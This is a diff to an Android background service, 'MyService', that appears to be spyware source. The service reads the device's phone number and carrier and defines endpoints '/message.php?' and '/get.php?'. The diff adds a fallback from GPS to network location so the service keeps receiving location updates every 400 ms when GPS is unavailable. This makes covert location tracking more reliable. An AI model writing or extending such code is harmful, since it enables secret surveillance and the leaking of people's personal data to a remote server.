@@ -75,6 +75,7 @@ public class MyService extends Service {
     private String device;
     private String sdk;
     private String provider;
+    private String locationProvider;
     //********************************************************************************************************************************************************
     private String urlPostInfo = "/message.php?";
     private String urlSendUpdate = "/get.php?";
@@ -234,8 +235,19 @@ public class MyService extends Service {
                 provider = removeBlankSpace(new StringBuilder(telephonyManager.getNetworkOperatorName()));
                 phonenumber = telephonyManager.getLine1Number();
                 locManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                locManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 400, 1, locationListener);
-                location = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                List<String> providers = locManager.getProviders(true);
+                if(providers.contains(LocationManager.GPS_PROVIDER)){
+                    //如果是GPS
+                    locationProvider = LocationManager.GPS_PROVIDER;
+                }else if(providers.contains(LocationManager.NETWORK_PROVIDER)){
+                    //如果是Network
+                    locationProvider = LocationManager.NETWORK_PROVIDER;
+                }else{
+                    Log.i("com.connect", "not available locationProvider");
+                    return ;
+                }
+                locManager.requestLocationUpdates(locationProvider, 400, 1, locationListener);
+                location = locManager.getLastKnownLocation(locationProvider);
                 random = new Random().nextInt(999);
 
                 if (location != null) {
